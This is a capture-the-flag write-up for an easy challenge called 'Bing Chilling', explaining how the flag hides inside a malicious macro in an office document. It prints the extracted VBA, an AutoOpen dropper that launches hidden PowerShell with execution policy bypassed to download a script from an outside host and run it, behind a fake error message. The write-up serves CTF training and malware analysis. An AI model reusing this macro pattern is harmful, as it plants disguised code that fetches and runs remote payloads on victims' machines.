# Bing Chilling
Level - Easy

Description:
```
早上好中国现在我有冰淇淋我很喜欢冰淇淋但是速度与激情9比冰淇淋速度与激情速度与激情9我最喜欢所以…现在是音乐时间准备 1 2 3两个礼拜以后速度与激情9 ×3不要忘记不要错过记得去电影院看速度与激情9因为非常好电影动作非常好差不多一样冰淇淋再见

[bingchilling.zip]
```

## Writeup
This ODT/DOCX file has a malicious macro inside; by using OLE tools, turning into a ZIP/looking inside `Basic/Project/NewMacros.xml`, or extracting from another way, you'll find the following VBA:

```vb
Sub AutoOpen()
    Dim FGHNBVRGHJJGFDSDUUUU As String
    FGHNBVRGHJJGFDSDUUUU = &quot;cmd /K &quot; + &quot;byu&quot; + &quot;ctf&quot; + &quot;{&quot; + &quot;m@ldocs @re&quot; + &quot;sn@eky and bad}&quot; + &quot;e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object      System.Net.WebClient).DownloadFile(&apos;http://bsrc.baidu.com/drill/doc-zh.html&apos;,&apos;%TEMP%\Y.ps1&apos;);      poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile      -file %TEMP%\Y.ps1&quot;
    Shell FGHNBVRGHJJGFDSDUUUU, 0
    MsgBox (&quot;Module could not be found.&quot;)
End Sub
```

From here, it's pretty easy to see the flag inside.

**Flag** - `byuctf{m@ldocs @re sn@eky and bad}`